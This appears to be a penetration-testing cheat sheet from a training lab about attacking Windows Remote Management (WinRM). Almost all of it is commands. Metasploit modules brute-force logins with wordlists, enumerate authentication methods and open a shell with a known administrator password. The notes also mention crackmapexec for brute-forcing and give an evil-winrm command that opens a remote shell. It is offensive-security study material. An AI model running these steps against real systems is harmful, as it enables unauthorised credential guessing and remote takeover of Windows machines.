# WinRM

---

#### Brute-Forcing with Metasploit

msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit

#### Enumerating Authentification Method using Metasploit

msfconsole -q
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit

#### Getting Shell with Metasploit

use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit

---

crackmapexec is a tool which is able to brutce-force user credentials out of of WinRM


another script would be "evil-winrm" which enables us a command shell session on
the target system.

evil-winrm.rb -u administrator -p 'password123' -i <target_ip>
